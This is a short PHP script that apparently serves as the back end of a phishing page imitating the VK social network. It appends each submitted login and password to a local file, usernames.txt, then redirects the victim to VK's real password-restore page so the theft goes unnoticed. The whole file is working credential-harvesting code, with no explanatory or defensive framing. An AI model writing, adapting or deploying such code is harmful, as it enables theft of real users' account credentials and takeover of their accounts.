<?php

file_put_contents("usernames.txt", "Vk Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://vk.com/restore/');
exit();
